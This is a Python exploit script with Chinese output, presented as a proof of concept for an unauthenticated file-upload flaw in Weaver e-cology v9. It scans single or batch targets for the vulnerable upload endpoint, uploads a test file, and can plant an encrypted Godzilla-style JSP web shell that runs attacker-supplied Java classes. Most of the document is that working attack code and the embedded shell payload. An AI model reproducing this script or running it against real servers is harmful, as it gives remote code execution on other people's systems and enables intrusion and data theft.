#-*- coding:utf-8 -*-
import requests
import re
import sys
import os
import warnings
warnings.filterwarnings("ignore")
requests.adapters.DEFAULT_RETRIES = 5



def title():
    print('+--------------------------------------------')
    print('+     \033[34mVersion:  泛微 e-cology v9 前台getshell \033[0m')
    print('+     \033[36m使用格式:	python3 poc.py -u url    	\033[0m')
    print('+     \033[36m  	python3 poc.py -f file 			    \033[0m')
    print('+     \033[36m  	python3 poc.py -us url   			\033[0m')
    print('+     \033[36m  	python3 poc.py -fs file   			\033[0m')
    print('+     \033[35m   url without https:// or http:// 	\033[0m')
    print('+     \033[31m                       Python By Stanke \033[0m')
    print('+--------------------------------------------')



def test_write(msg):
	file_path = os.getcwd() + '/result.txt'
	file = open(file_path, 'a')
	file.write(msg)
	file.write('\n')
	file.close()

def result_write(msg):
	file_path = os.getcwd() + '/result.txt'
	file = open(file_path, 'a')
	file.write(msg)
	file.write('\n')
	file.close()		

def wrong_write(msg):
	file_path = os.getcwd() + '/requests_error.txt'
	file = open(file_path, 'a')
	file.write(msg)
	file.write('\n')
	file.close()

def upload_test_file(allurl,url):
	headers = {
	"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
	"x-forwarded-for": "127.0.0.1",
	}
	file_message = "Penetration test"
	files = {'Penetration.jsp':file_message}
	data = {'enctype':'multipart/form-data'}
	try:
		response = requests.post(url = allurl,data = data,files = files,headers = headers,verify = False,timeout = 5)
		if response.status_code == 200:
			if "http://" in allurl:
				file_url = "http://" + url + "/page/exportImport/fileTransfer/Penetration.jsp"
			else:
				file_url = "https://" + url + "/page/exportImport/fileTransfer/Penetration.jsp"
			try:
				res = requests.get(url = file_url,headers = headers,verify = False,timeout = 5)
				result = res.text.strip()
				if res.status_code == 200 and result == "Penetration test":
					test_write(file_url)
					print("\033[32m[+] 测试文件上传成功,文件路径为 %s \033[0m" % format(file_url,"<30"))
					return True
				else:
					print("\033[35m[x] %s 		文件上传失败\033[0m" % format(url,"<30"))
			except Exception as e:
				print("\033[31m[x] %s 		文件请求失败\033[0m" % format(url,"<30"))
	except Exception as e:
		print("\033[31m[x] %s 		文件上传失败\033[0m" % format(url,"<30"))


def verify(url):
	http_url = "http://" + url + "/page/exportImport/uploadOperation.jsp"
	headers = {
				"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
				"Content-Type": "application/x-www-form-urlencoded",
				"Connection": "close",
	}
	try:
		response = requests.get(url = http_url,headers=headers,verify = False,timeout = 5)
		result = response.text.strip()
		if response.status_code == 200 and result == "":
			upload_test_file(http_url,url)
		else:
			print("\033[31m[x] %s 		不存在前台文件上传漏洞\033[0m" % format(url,"<30"))
	except Exception as e:
		https_url = "https://" + url + "/page/exportImport/uploadOperation.jsp"
		try:
			response = requests.get(url = https_url,headers = headers,verify = False,timeout = 5)
			result = response.text.strip()
			if response.status_code == 200 and result == "":
				upload_test_file(https_url,url)
			else:
				print("\033[31m[x] %s 		不存在前台文件上传漏洞\033[0m" % format(url,"<30"))
		except Exception as e:
			print("\033[33m[x] %s 		requests error\033[0m" % format(url,"<30"))
			wrong_write(url)


def upload_shell(allurl,url):
	headers = {
	"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
	"x-forwarded-for": "127.0.0.1",
	}
	shell = '<%! String xc="3c6e0b8a9c15224a"; String pass="pass"; String md5=md5(pass+xc); class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),"AES"));return c.doFinal(s); }catch (Exception e){return null; }} public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance("MD5");m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; } public static String base64Encode(byte[] bs) throws Exception {Class base64;String value = null;try {base64=Class.forName("java.util.Base64");Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);value = (String)Encoder.getClass().getMethod("encodeToString", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Encoder"); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod("encode", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e2) {}}return value; } public static byte[] base64Decode(String bs) throws Exception {Class base64;byte[] value = null;try {base64=Class.forName("java.util.Base64");Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Decoder"); Object decoder = base64.newInstance(); value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e2) {}}return value; }%><%try{byte[] data=base64Decode(request.getParameter(pass));data=x(data, false);if (session.getAttribute("payload")==null){session.setAttribute("payload",new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute("parameters",data);java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();Object f=((Class)session.getAttribute("payload")).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));} }catch (Exception e){}%>'
	files = {'shell.jsp':shell}
	data = {'enctype':'multipart/form-data'}
	try:
		response = requests.post(url = allurl,data = data,files = files,headers = headers,verify = False,timeout = 5)
		if response.status_code == 200:
			if "http://" in allurl:
				file_url = "http://" + url + "/page/exportImport/fileTransfer/shell.jsp"
			else:
				file_url = "https://" + url + "/page/exportImport/fileTransfer/shell.jsp"
			test_result = upload_test_file(allurl,url)
			if test_result == True:
				try:
					res = requests.get(url = file_url,headers = headers,verify = False,timeout = 5)
					result = res.text.strip()
					if res.status_code == 200 and result == "":
						print("\033[35m[+] (Godzilla and pass)shell上传成功,地址为 %s \033[0m" % format(file_url,"<30"))
						result_write(file_url)
					else:
						print("\033[31m[x] %s 		shell上传失败\033[0m" % format(url,"<30"))
				except Exception as e:
					print("\033[31m[x] %s 		shell请求失败\033[0m" % format(url,"<30"))
	except Exception as e:
		print("\033[31m[x] %s 		shell上传失败\033[0m" % format(url,"<30"))


def verify_shell(url):
	http_url = "http://" + url + "/page/exportImport/uploadOperation.jsp"
	headers = {
				"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
				"Content-Type": "application/x-www-form-urlencoded",
				"Connection": "close",
	}
	try:
		response = requests.get(url = http_url,headers=headers,verify = False,timeout = 5)
		result = response.text.strip()
		if response.status_code == 200 and result == "":
			upload_shell(http_url,url)
		else:
			print("\033[31m[x] %s 		不存在前台文件上传漏洞\033[0m" % format(url,"<30"))
	except Exception as e:
		https_url = "https://" + url + "/page/exportImport/uploadOperation.jsp"
		try:
			response = requests.get(url = https_url,headers = headers,verify = False,timeout = 5)
			result = response.text.strip()
			if response.status_code == 200 and result == "":
				upload_shell(http_url,url)
			else:
				print("\033[31m[x] %s 		不存在前台文件上传漏洞\033[0m" % format(url,"<30"))
		except Exception as e:
			print("\033[33m[x] %s 		requests error\033[0m" % format(url,"<30"))
			wrong_write(url)
		

def read_file(file_name):
	with open(file_name, 'r') as f:
		lines = f.readlines()
		for line in lines:
			line = line.strip()
			verify(line)

def read_file_to_shell(file_name):
	with open(file_name, 'r') as f:
		lines = f.readlines()
		for line in lines:
			line = line.strip()
			verify_shell(line)

if __name__ == '__main__':
	title()
	if len(sys.argv) == 3:
		if sys.argv[1] == "-u":
			verify(sys.argv[2])
		elif sys.argv[1] == "-f":
			read_file(sys.argv[2])
		elif sys.argv[1] == "-us":
			verify_shell(sys.argv[2])
		elif sys.argv[1] == "-fs":
			read_file_to_shell(sys.argv[2])
		else:
			print('     \033[31m           未输入正确格式参数    \033[0m')
	else:
		 print('     \033[31m           参数格式错误            \033[0m')






